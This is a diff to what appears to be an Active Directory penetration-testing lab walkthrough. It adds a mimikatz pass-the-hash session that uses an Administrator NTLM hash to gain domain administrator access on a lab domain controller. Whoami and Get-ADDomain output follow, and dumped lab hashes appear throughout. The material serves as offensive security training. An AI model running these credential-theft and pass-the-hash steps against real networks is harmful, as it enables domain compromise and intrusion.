@@ -847,3 +847,96 @@ User : BASTION$
 LM   :
 NTLM : f186a027c59972382ebb051ff49decd4
 ```
+
+
+
+Access to DC techcorp-dc.techcorp.local with ntlm using pass the hash with Amdinistrator user:
+
+```
+
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>C:\AD\Tools\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::pth /user:Administrator /domain:techcorp.local /ntlm:bc4cf9b751d196c4b6e1a2ba923ef33f /run:cmd
+user    : Administrator
+domain  : techcorp.local
+program : cmd
+impers. : no
+NTLM    : bc4cf9b751d196c4b6e1a2ba923ef33f
+  |  PID  704
+  |  TID  5524
+  |  LSA Process is now R/W
+  |  LUID 0 ; 55849160 (00000000:035430c8)
+  \_ msv1_0   - data copy @ 000002325CD3CF80 : OK !
+  \_ kerberos - data copy @ 000002325D06DD48
+   \_ aes256_hmac       -> null
+   \_ aes128_hmac       -> null
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 000002325C6E4C28 (32) -> null
+
+```
+
+```
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>whoami
+whoami
+techcorp\administrator
+```
+
+Get Domain:
+```
+PS C:\Users\Administrator> Get-ADDOmain
+Get-ADDOmain
+
+
+AllowedDNSSuffixes                 : {}
+ChildDomains                       : {us.techcorp.local}
+ComputersContainer                 : CN=Computers,DC=techcorp,DC=local
+DeletedObjectsContainer            : CN=Deleted Objects,DC=techcorp,DC=local
+DistinguishedName                  : DC=techcorp,DC=local
+DNSRoot                            : techcorp.local
+DomainControllersContainer         : OU=Domain Controllers,DC=techcorp,DC=local
+DomainMode                         : Windows2016Domain
+DomainSID                          : S-1-5-21-2781415573-3701854478-2406986946
+ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=techcorp,DC=local
+Forest                             : techcorp.local
+InfrastructureMaster               : Techcorp-DC.techcorp.local
+LastLogonReplicationInterval       :
+LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=techcorp,DC=lo
+                                     cal}
+LostAndFoundContainer              : CN=LostAndFound,DC=techcorp,DC=local
+ManagedBy                          :
+Name                               : techcorp
+NetBIOSName                        : TECHCORP
+ObjectClass                        : domainDNS
+ObjectGUID                         : 5e4e997a-befa-4c9d-8153-4ed1b11b6818
+ParentDomain                       :
+PDCEmulator                        : Techcorp-DC.techcorp.local
+PublicKeyRequiredPasswordRolling   : True
+QuotasContainer                    : CN=NTDS Quotas,DC=techcorp,DC=local
+ReadOnlyReplicaDirectoryServers    : {}
+ReplicaDirectoryServers            : {Techcorp-DC.techcorp.local}
+RIDMaster                          : Techcorp-DC.techcorp.local
+SubordinateReferences              : {DC=us,DC=techcorp,DC=local, DC=ForestDnsZones,DC=techcorp,DC=local,
+                                     DC=DomainDnsZones,DC=techcorp,DC=local, CN=Configuration,DC=techcorp,DC=local}
+SystemsContainer                   : CN=System,DC=techcorp,DC=local
+UsersContainer                     : CN=Users,DC=techcorp,DC=local
+```
